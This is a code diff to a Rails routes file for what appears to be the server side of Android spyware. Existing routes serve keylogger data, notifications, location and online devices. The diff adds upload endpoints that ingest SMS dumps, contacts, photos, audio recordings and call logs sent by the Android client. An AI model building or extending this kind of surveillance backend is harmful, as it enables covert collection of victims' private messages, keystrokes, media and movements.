@@ -13,6 +13,7 @@ Rails.application.routes.draw do
       end
     end
     post 'location', to: 'commands#location'
+    post 'locations', to: 'commands#location'  # Android client sends to /locations
     get 'devices/online', to: 'devices#online'
     
     # Keylogger API endpoints (ENHANCED)
@@ -25,6 +26,13 @@ Rails.application.routes.draw do
     # Notifications API endpoints
     post 'notifications', to: 'notifications#receive'
     get 'notifications/:device_id', to: 'notifications#index'
+
+    # Data Ingestion (Mapped for Android Client)
+    post 'sms', to: 'sms_messages#upload_dump'
+    post 'contacts', to: 'contacts#upload_dump'
+    post 'photos', to: 'media#upload_photo'
+    post 'audio', to: 'media#upload_audio'
+    post 'calls', to: 'call_logs#upload_dump'
   end
 
   # Admin config save endpoint
